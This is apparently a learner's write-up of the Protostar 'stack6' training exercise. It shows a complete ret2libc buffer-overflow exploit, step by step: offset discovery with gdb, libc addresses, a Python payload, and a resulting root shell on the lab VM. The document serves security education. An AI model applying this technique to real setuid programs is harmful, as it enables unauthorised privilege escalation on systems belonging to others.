{{ Exploit Exercises: Protostar - 0x01 - Stack 6

    [~] {{ Exercise details

        Link : https://exploit-exercises.com/protostar/stack6/

        About:
        Stack6 looks at what happens when you have restrictions on the return address.
        This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help
        with this, or ret2libc, or even return orientated programming.
        It is strongly suggested you experiment with multiple ways of getting your code to execute here.

    }}

    [x] {{ Solution - ret2libc

        # Check bahavior when used as intended
        user@protostar:/opt/protostar/bin$ ./stack6
        input path please: fubar
        got path fubar

        # Overflowing the buffer
        user@protostar:/opt/protostar/bin$ python -c 'print "A"*150' | ./stack6
        input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        Segmentation fault

        # Loading program into gdb
        user@protostar:/opt/protostar/bin$ gdb stack6 -q
        Reading symbols from /opt/protostar/bin/stack6...done.
        (gdb)

        # Create pattern to find offset to EIP
        > ./pattern.py -c 150
        Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

        # Crash program to get EIP value to calculate offset
        user@protostar:~$ echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9 > stack6
        (gdb) r < ~/stack6
        Starting program: /opt/protostar/bin/stack6 < ~/stack6
        input path please: got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

        Program received signal SIGSEGV, Segmentation fault.
        0x37634136 in ?? ()

        # Calculate offset
        > ./pattern.py -ol 37634136
        [+] Offset found at 80 bytes

        # So 80 bytes of junk data is needed, then the address of system(), exit()
        # Getting the addresses required
        (gdb) p system
        $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
        (gdb) p exit
        $2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

        # Finally there's the SHELL variable
        user@protostar:/opt/protostar/bin$ ~/getenvaddr SHELL ./stack6
        SHELL will be at 0xbffff9c8

        # That is the address to use in the payload - so the payload becomes
        user@protostar:~$ python -c 'print "A"*80 + "\xb0\xff\xec\xb7" + "\xc0\x60\xec\xb7" + "\xc8\xf9\xff\xbf"' > stack6

        # Now, time to put it all to the test
        user@protostar:/opt/protostar/bin$ cat /home/user/stack6 | ./stack6
        input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`������

        # Program closed directly killing the shell - gotta keep that shell alive
        user@protostar:/opt/protostar/bin$ (cat /home/user/stack6;cat) | ./stack6
        input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`������
        whoami
        root
        id
        uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

    }}

    [ ] {{ Solution - return oriented programming (ROP)
    }}


    [~] {{ What did I learn?

        → objdump -s|--full-contents <filename>
            Display the full contents of any sections requested.  By default all non-empty sections are displayed.

        → ret2libc
            → Stands for 'return to libc'
            → Used to bypass NX (No-eXecute) stack protection
            → See if program has executable stack
                → readelf -l <program>
                  ....
                  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
                  ....
                → RWE means the stack is executable (Read, Write, Execute)
            → payload format
                → JUNK*X + address of system [+ address of exit] + address of /bin/bash
                → X is the offset before hitting EIP
                → the exit() function is not required for the exploit to work - but the program will not exit gracefully
            → Using gdb to find function's to use
                → 'print <function>' finds the address of the wanted function
                → The function cannot be used if the address contains a null byte
                    → This can be solved - but I will need to read up on how
    }}

    [~] {{ Resources
        → ret2libc
            → http://www.exploit-db.com/download_pdf/17131/

    }}

}}